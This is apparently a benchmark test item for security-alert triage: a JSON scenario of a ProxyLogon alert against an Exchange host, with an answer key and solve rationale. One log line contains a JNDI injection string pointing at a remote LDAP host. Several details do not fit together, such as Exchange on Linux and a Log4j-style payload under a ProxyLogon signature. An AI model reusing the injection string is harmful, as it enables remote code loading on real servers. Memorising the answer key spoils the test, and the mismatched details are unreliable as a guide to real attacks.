@@ -1,0 +1,78 @@
+{
+  "id": "A-1025",
+  "alert": {
+    "src": "203.0.113.169",
+    "dst": "10.2.1.182",
+    "dst_port": 443,
+    "proto": "tcp",
+    "signature": "ET EXPLOIT ProxyLogon SSRF",
+    "claimed_cve": "CVE-2021-26855",
+    "severity": "medium",
+    "ts": "2026-09-10T06:56:00Z",
+    "flow_id": "f2612"
+  },
+  "world": {
+    "assets": {
+      "10.2.1.182": {
+        "host": "host-10-2-1-182",
+        "os": "linux",
+        "criticality": "high",
+        "owner": "platform-team",
+        "services": {
+          "443": {
+            "product": "microsoft-exchange",
+            "version": "15.2.793"
+          }
+        },
+        "peers": [
+          "10.2.6.214"
+        ]
+      }
+    },
+    "cves": {
+      "CVE-2021-26855": {
+        "product": "microsoft-exchange",
+        "patched_in": "15.2.792",
+        "exploit_maturity": "weaponized"
+      }
+    },
+    "flows": {
+      "f2612": {
+        "direction": "inbound",
+        "bytes_out": 128,
+        "bytes_in": 340,
+        "duration_s": 1,
+        "state": "RST",
+        "note": "connection reset, no data exfil"
+      }
+    },
+    "logs": {
+      "host-10-2-1-182": [
+        "[host-10-2-1-182] 443 POST /api/x 403 jndi:ldap://203.0.113.169/a  <- payload rejected",
+        "[host-10-2-1-182] no new child processes"
+      ]
+    },
+    "proc_trees": {
+      "host-10-2-1-182": {
+        "suspicious": false,
+        "tree": "java (steady state, no children)",
+        "persistence": null
+      }
+    },
+    "sessions": [
+      {
+        "src": "203.0.113.169",
+        "dst": "10.2.1.182",
+        "port": 443,
+        "legit": false
+      }
+    ],
+    "firewall": []
+  },
+  "ground_truth": {
+    "verdict": "FAILED",
+    "action": "monitor"
+  },
+  "adversarial": false,
+  "solve_rationale": "target patched above patched_in; payload rejected; RST, no exfil"
+}
